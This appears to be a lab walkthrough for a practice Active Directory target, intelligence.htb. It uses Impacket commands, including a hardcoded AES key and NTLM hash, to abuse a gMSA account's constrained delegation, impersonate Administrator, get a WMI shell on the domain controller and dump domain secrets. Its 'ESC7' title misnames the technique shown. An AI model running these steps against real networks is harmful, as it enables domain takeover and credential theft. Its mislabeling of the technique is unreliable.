# ESC7 Exploitation via gMSA Delegation – Step-by-Step

## 1️⃣ Get TGT for gMSA `svc_int$`
```bash
getTGT.py intelligence.htb/svc_int$ -aesKey 0ceb5372ef23f53495569d0c64710ce13f5d44684bbb2ad6ece5556b3dbe878b
```
### ✅ Why this tool?
Requests a **Kerberos TGT** for the gMSA account using its AES256 key.

### ✅ Why these options?
- `intelligence.htb/svc_int$` → domain and account.
- `-aesKey` → uses AES256 key for authentication.
- Saves ticket as `svc_int$.ccache`.

---

## 2️⃣ Request a Service Ticket Impersonating Administrator
```bash
KRB5CCNAME=svc_int$.ccache getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :a9f4721de917a40fd9010ad815708184
```
### ✅ Why this tool?
Obtains a **service ticket** to impersonate Administrator using KCD.

### ✅ Why these options?
- `KRB5CCNAME=svc_int$.ccache` → use gMSA TGT.
- `-spn` → target service SPN.
- `-impersonate Administrator` → impersonate admin user.
- `-hashes` → use NTLM hash of gMSA.

---

## 3️⃣ Export the Administrator Ticket
```bash
export KRB5CCNAME=$(pwd)/Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```
### ✅ Why?
Sets the environment to use the new Administrator ticket.

---

## 4️⃣ Execute Commands on DC using WMIExec
```bash
wmiexec.py -k -no-pass dc.intelligence.htb
```
### ✅ Why this tool?
Provides a **semi-interactive shell** over WMI using Kerberos.

### ✅ Why these options?
- `-k` → Kerberos auth.
- `-no-pass` → no password needed.
- Target: `dc.intelligence.htb`.

---

## 5️⃣ (Optional) Dump Domain Secrets
```bash
secretsdump.py -k -no-pass intelligence.htb/administrator@10.10.10.248
```
### ✅ Why this tool?
Extracts **NTLM hashes**, **LSA secrets**, and **Kerberos keys** from DC.

### ✅ Why these options?
- `-k` → use Kerberos.
- `-no-pass` → no password required.
- `administrator@10.10.10.248` → authenticates to DC.

---

## ✅ Why This Works?
1. Extract gMSA AES256 key → account has delegation rights.
2. Obtain TGT → authenticate as `svc_int$`.
3. Request S4U2Self & S4U2Proxy → impersonate Administrator.
4. Use Admin Ticket → gain privileged access.
5. Dump Hashes / Get Shell → full domain compromise.
